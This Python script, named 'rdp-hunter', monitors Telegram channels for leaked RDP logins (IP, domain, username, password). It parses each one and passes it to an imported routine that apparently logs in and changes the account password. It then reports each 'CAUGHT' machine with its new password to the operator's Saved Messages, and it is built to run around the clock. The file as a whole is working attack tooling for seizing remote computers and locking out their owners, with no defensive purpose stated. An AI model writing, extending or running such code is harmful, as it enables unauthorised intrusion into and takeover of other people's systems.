import os
import asyncio
import json
from datetime import datetime
from telethon import TelegramClient, events
from telethon.tl.types import PeerChannel
from telethon.sessions import StringSession
from config import (
    API_ID, API_HASH, CHANNEL_USERNAMES, SESSION_NAME,
    SAVED_MESSAGES, PHONE_NUMBER, STRING_SESSION, BOT_TOKEN, get_channels
)
from changer import parse_credentials, process_rdp, generate_password


async def send_to_saved(client, text):
    try:
        await client.send_message(SAVED_MESSAGES, text)
    except Exception:
        pass


def format_result(record):
    if record["status"] == "success":
        return (
            f"✅ **CAUGHT**\n"
            f"🌐 IP: `{record['ip']}`\n"
            f"👤 User: `{record['domain']}\\{record['username']}`\n"
            f"🔑 New Pass: `{record['new_password']}`\n"
            f"⏰ Time: {record['timestamp']}"
        )
    else:
        return (
            f"❌ **FAILED**\n"
            f"🌐 IP: `{record['ip']}`\n"
            f"👤 User: `{record['domain']}\\{record['username']}`\n"
            f"⚠️ Error: {record['error']}\n"
            f"⏰ Time: {record['timestamp']}"
        )


async def main():
    # Bot token still needs API_ID/API_HASH for Telethon connection
    if not BOT_TOKEN and (API_ID == 0 or not API_HASH):
        print("❌ Config missing: set API_ID, API_HASH, CHANNEL_USERNAMES env vars")
        return
    
    channels = get_channels()
    if not channels:
        print("❌ No channels configured. Set CHANNEL_USERNAMES env var (comma-separated)")
        return
    
    # Priority: BOT_TOKEN > STRING_SESSION > file session
    if BOT_TOKEN:
        client = TelegramClient(SESSION_NAME, API_ID, API_HASH)
        print("[*] Using Bot Token")
    elif STRING_SESSION:
        session = StringSession(STRING_SESSION)
        client = TelegramClient(session, API_ID, API_HASH)
        print("[*] Using StringSession")
    else:
        client = TelegramClient(SESSION_NAME, API_ID, API_HASH)
        print("[*] Using file session")
    
    @client.on(events.NewMessage(chats=channels))
    async def handler(event):
        text = event.raw_text
        parsed = parse_credentials(text)
        if not parsed:
            return
        
        ip, domain, username, old_pass = parsed
        chat = await event.get_chat()
        chat_name = getattr(chat, 'username', getattr(chat, 'title', str(event.chat_id)))
        print(f"[+] Detected from {chat_name}: {ip} {domain}\\{username}")
        
        success, msg, record = process_rdp(ip, domain, username, old_pass)
        print(f"[+] Result: {msg}")
        
        if record:
            await send_to_saved(client, format_result(record))
    
    print("[*] rdp-hunter starting...")
    print(f"[*] Monitoring {len(channels)} channel(s): {', '.join(channels)}")
    
    if BOT_TOKEN:
        await client.start(bot_token=BOT_TOKEN)
        print("[*] Bot connected")
    elif STRING_SESSION:
        await client.connect()
        if not await client.is_user_authorized():
            print("❌ StringSession invalid/expired")
            return
    elif PHONE_NUMBER:
        await client.start(phone=PHONE_NUMBER)
    else:
        await client.start()
    
    print("[*] Connected. Running 24/7...")
    await client.run_until_disconnected()


if __name__ == "__main__":
    asyncio.run(main())